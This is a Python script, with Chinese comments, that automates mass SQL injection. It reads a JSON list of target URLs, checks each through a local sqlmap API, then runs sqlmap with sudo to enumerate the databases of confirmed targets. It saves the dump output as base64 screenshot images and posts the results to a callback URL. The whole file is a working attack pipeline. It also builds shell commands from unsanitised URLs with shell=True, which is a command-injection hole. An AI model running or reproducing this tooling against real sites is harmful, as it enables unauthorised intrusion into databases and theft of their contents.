import argparse
import requests
import json
import platform
import os
import io
import time
import base64
from multiprocessing import Pool
import traceback
import subprocess
from PIL import ImageFont
from PIL import Image
from PIL import ImageDraw

total_urls=[]
target_url = []
run_complete_verify_url = []
run_complete_attack_url = []


headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
           "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",}


def make_pic(a,linessss):
    try:
        with open(a+".txt","w+",errors="ignore") as w:
            w.write(linessss)
        with open(a+".txt","r",errors="ignore") as f:
            lines = f.readlines()
        os.remove(a+".txt")
        imageFile = 'black.jpg'
        img = Image.open(imageFile)
        # 选择字体与大小
        #ubuntu
        font = ImageFont.truetype("FreeMono.ttf", size=20)
        y_text = 0
        for line in lines:
            word = """{}""".format(line)
            width, height = font.getsize(line)
            y_text += height
        position = (0, 0)
        color = (255,255,255)

        #图片颜色
        bg_color = (0,0,0)
        # 生成背景图片
        img = Image.new('RGB', (1920, y_text+20), bg_color)
        draw = ImageDraw.Draw(img)
        y_text = 0
        for line in lines:
            word = """{}""".format(line)
            width, height = font.getsize(line)
            draw.text((0, y_text), word,color,font=font)
            y_text += height
        
        pic_path = a+'.png'
        # 保存图片
        img.save(r''+pic_path)
        f=open(pic_path,'rb')#第一个参数图像路径
        base64b=base64.b64encode(f.read())
        f.close()
        base64str = str(base64b)
        base64str = base64str.replace("b'","")
        base64str = base64str.replace("'","")
        return base64str
    except Exception as e:
        print(e)
        print('traceback.print_exc(): ', traceback.print_exc())


def sqlmap(vul_info,num):
    vul_id = vul_info["vul_id"]
    vul_url = vul_info["vul_url"]
    host = vul_info["vul_url"]
    urlnew="http://127.0.0.1:8775/task/new"
    urlscan="http://127.0.0.1:8775/scan/"
    headers={"user-agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"}
    pd=requests.get(url=urlnew,headers=headers)
    jsons=pd.json()
    id=jsons['taskid']
    scan=urlscan+id+"/start"
    print("[*]scanurl:",scan)
    data=json.dumps({"url":"{}".format(host),"smart":True,"timeout":"10","Threads":3,"keepAlive":True,"nullConnection":True,"tech":"BEUSQ"})
    headerss={"Content-Type":"application/json"}
    scans=requests.post(url=scan,headers=headerss,data=data)
    swq=scans.json()
    print('--------STATUS---------')
    status="http://127.0.0.1:8775/scan/{}/status".format(id)
    print(status)
    print(host)
    while True:
        time.sleep(2)
        staw=requests.get(url=status,headers=headers)
        print(">>>>>>>>>>>>>>"+str(num)+":status: "+staw.json()['status'])
        if staw.json()['status'] == 'terminated':
            datas=requests.get(url='http://127.0.0.1:8775/scan/{}/data'.format(id))
            dat=datas.json()['data']
            if dat:
                print('[*]data:',dat)
                #print("写入文件：{}".format(host))
                try:
                    with open("sqlinj.txt",errors="ignore",encoding='UTF-8') as f:
                        vullist_json = json.load(f)
                        print("vullist_json")
                        print(vullist_json)
                        print("-"*15)
                    run_complete_verify_url = vullist_json
                    run_complete_verify_url.append({"vul_id":vul_id,"vul_url":vul_url,"flag":True,"base64str":"","payload":""})
                    #print(run_complete_verify_url)
                    with open("sqlinj.txt",'w',errors="ignore") as w:
                        data2 = json.dumps(run_complete_verify_url)
                        w.write(data2)
                        w.flush()
                except  Exception as e:
                    print('traceback.print_exc(): ', traceback.print_exc())
            else:
                try:
                    with open("sqlinj.txt",errors="ignore",encoding='UTF-8') as f:
                        vullist_json = json.load(f)
                        print("vullist_json")
                        print(vullist_json)
                        print("-"*15)
                    run_complete_verify_url = vullist_json
                    run_complete_verify_url.append({"vul_id":vul_id,"vul_url":vul_url,"flag":False,"base64str":"","payload":""})
                    with open("sqlinj.txt",'w',errors="ignore") as w:
                        data2 = json.dumps(run_complete_verify_url)
                        w.write(data2)
                        w.flush()
                except  Exception as e:
                    print('traceback.print_exc(): ', traceback.print_exc())
                pass
            break
        elif staw.json()['status'] == 'running':
            continue

def sqlmap_attack(vul_info,num):
    vul_url = vul_info["vul_url"]
    print("攻击>>>>>>>>>>>>>>"+str(num)+vul_url)
    sqlmap_path = "./sqlmapproject-sqlmap-dcf304c/sqlmap.py"
    print("getcwd>>>>>>>>>>>>>>"+os.getcwd())
    #sqlmap_path = r"C:\fxh\tool\sqlmap\sqlmap.py"
    cmd = "sudo python "+sqlmap_path+" -u " +'"'+vul_url+'"' + " -v 0 --random-agent --technique=BEUSQ --batch -o --dbs"
    cmd2 = "sudo python "+sqlmap_path+" -u " +'"'+vul_url+'"' + " -v 0 --random-agent --technique=BEUSQ --batch -o --tables"
    print(cmd)
    try:
        process = subprocess.Popen(cmd,stdout=subprocess.PIPE,shell=True)
        print(">"*10)
        out, err = process.communicate()
        status = process.wait()
        print("cmd out: ", out.decode())
        print("<"*10)
        lines = out.decode()
        
        if "available databases" in lines or "Database:" in lines:
            print("查到数据库 添加"+vul_url)
            base64str = make_pic(str(time.time()),lines)
            try:
                with open("sqlinj.txt",errors="ignore",encoding='UTF-8') as f:
                    vullist_json = json.load(f)
                run_complete_attack_url = []
                for vulinfo in vullist_json:
                    vul_url_json = vulinfo["vul_url"]
                    if vul_url == vul_url_json:
                        payload = "python sqlmap.py"+" -u " +'"'+vul_url+'"' + " -v 0 --random-agent --technique=BEUSQ --batch -o --dbs"
                        temp = {"vul_id":vulinfo["vul_id"],"vul_url":vul_url,"flag":vulinfo["flag"],"base64str":base64str,"payload":payload}
                        run_complete_attack_url.append(temp)
                    else:
                        run_complete_attack_url.append(vulinfo)
                with open("sqlinj.txt",'w',errors="ignore") as w:
                    data2 = json.dumps(run_complete_attack_url)
                    w.write(data2)
                    w.flush()
                    run_complete_attack_url = []
            except Exception as e:
                print('traceback.print_exc(): ', traceback.print_exc())
        else:
            #不爆破表了 太费时间了也
            return
            process2 = subprocess.Popen(cmd2,stdout=subprocess.PIPE)
            print("("*10)
            out2, err2 = process2.communicate()
            status2 = process2.wait()
            print("cmd out: ", out2.decode())
            print(")"*10)
            lines2 = out2.decode()
            
            if "No tables found" in lines2:
                print("表也没查到 无法利用的sql注入"+vul_url)
            elif "Database:" in lines2:
                print("爆到表了 添加"+vul_url)
                make_pic(str(time.time()),lines2)
    except Exception as e:
        print('traceback.print_exc(): ', traceback.print_exc())

    print("[]"*10)

    
    
def poolmana(web_url,uuid,scanid,target):
    vullist = []
    with open(target,errors="ignore",encoding='UTF-8') as f:
        vullist_json = json.load(f)
        vullist = vullist_json["data"]
    #验证
    num = 0
    p = Pool(processes=8)
    li = []
    for vul_info in vullist:
        try:
            num += 1
            res = p.apply_async(sqlmap,args=(vul_info,num,))
            li.append(res)
        except Exception as e:
            print(e)
            pass
    p.close()
    p.join()
    
    #攻击
    p = Pool(processes=10)
    li = []
    with open("sqlinj.txt",errors="ignore",encoding='UTF-8') as f:
        vullist = json.load(f)
    print("*"*120)
    
    num = 0    
    for vul_info in vullist:
        try:
            if vul_info["flag"]:
                num += 1
                res = p.apply_async(sqlmap_attack,args=(vul_info,num,))
                li.append(res)
                
        except Exception as e:
            print(e)
            pass
    p.close()
    p.join()    
    



if __name__ == '__main__':
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest='target', help="json数据")
    parser.add_argument("-u", "--url", dest='url', help="返回接口")
    parser.add_argument("-uid", "--uuid", dest='uuid', help="用户id")
    parser.add_argument("-sid", "--scanid", dest='scanid', help="任务id")
    
    args = parser.parse_args()
    with open("sqlinj.txt",'w+',errors="ignore") as w:
        data2 = json.dumps(run_complete_verify_url)
        w.write(data2)
        print(data2)
    poolmana(args.url,args.uuid,args.scanid,args.target)
    print("程序运行结束，查收")
    with open("sqlinj.txt",errors="ignore",encoding='UTF-8') as f:
        vullist_json = json.load(f)
    info_list = {"uuid":args.uuid,"scanid":args.scanid,"vul_info":vullist_json}
    print(info_list)
    rep = requests.post(url=args.url,json=info_list)
    #print(rep.text)
